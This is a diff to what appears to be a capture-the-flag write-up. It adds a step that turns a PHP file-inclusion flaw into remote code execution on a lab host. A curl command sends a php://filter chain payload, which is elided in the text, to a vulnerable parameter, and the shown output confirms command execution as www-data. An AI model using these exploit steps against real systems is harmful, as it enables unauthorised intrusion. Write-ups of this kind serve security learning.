@@ -146,8 +146,23 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ```
 <img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />
 
-
 The generated payload started with a long php://filter/... chain. I stored it in a variable and sent it to the vulnerable endpoint using curl.
+
+```Bash
+payload='php://filter/...'
+curl -G --output - 'http://10.x.x.x/secret-script.php' \
+  --data-urlencode "file=$payload"
+```  
+
+<img width="1908" height="390" alt="rce-id-output" src="https://github.com/user-attachments/assets/e2e0a306-4a56-4beb-8844-397d90271977" />
+
+The response returned the result of the id command:
+
+'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+
+This confirmed that I had achieved remote code execution on the target as the www-data user.
+
+
 6. Reverse Shell
 7. Credential Discovery
 8. User Access via SSH Key Injection
